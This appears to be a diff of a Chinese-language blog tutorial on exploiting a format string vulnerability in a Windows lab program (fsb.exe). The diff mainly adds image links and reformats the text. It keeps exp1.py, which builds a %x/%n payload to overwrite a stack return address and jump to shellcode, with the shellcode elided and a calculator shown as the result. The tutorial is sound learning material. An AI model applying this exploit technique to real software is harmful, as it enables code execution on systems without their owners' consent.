@@ -123,16 +123,20 @@ mov ptr[EAX], ECX
 内存任意写写哪个地方--------最快捷的方法，就是覆盖最近函数的返回地址为shellcode的地址
 
 alt+k查看栈回溯，可以看到最近的一个返回地址存储在栈地址0x12faf0
-[图片]
+![图片](https://raw.githubusercontent.com/carterMgj/blog_img/master/2016-11-17-windows-pwn/9.png)
 崩溃时，查看栈，确定存储输入的起始地址是0x12fb48
-[图片]
+![图片](https://raw.githubusercontent.com/carterMgj/blog_img/master/2016-11-17-windows-pwn/10.png)
 所以我们的目的就是令：EAX=0x12faf0  ECX=0x12fb48
 
 ### 五. 编写漏洞利用脚本
 输入构造为：
-shellcode相应多的%x一些%nx来调整输出长度需要被覆盖的地址
-exp1.py
-```
+- shellcode
+- 相应多的%x
+- 一些%nx来调整输出长度
+- 需要被覆盖的地址
+
+**exp1.py**
+```python
 shellcode = '........'
 ret_addr = '\xf0\xfa\x12\x00'
 input1 = shellcode + '-%x'*218 + '%414000x' + '%414000x' + '%413908x' + '%n' + ret_addr
@@ -142,9 +146,9 @@ with open('flag.txt','wb') as f:
 ```
 
 为了效果，我在shellcode开头字节设置了0xCC -- int3，运行exp.py生成flag.txt，运行fsb.exe从flag.txt读取字符后使用printf函数打印，成功触发Fsb漏洞
-[图片]
+![图片](https://raw.githubusercontent.com/carterMgj/blog_img/master/2016-11-17-windows-pwn/11.png)
 弹出可爱的计算器
-[图片]
+![图片](https://raw.githubusercontent.com/carterMgj/blog_img/master/2016-11-17-windows-pwn/12.png)
 
 ## 六. 问题解决
 **问题描述：**
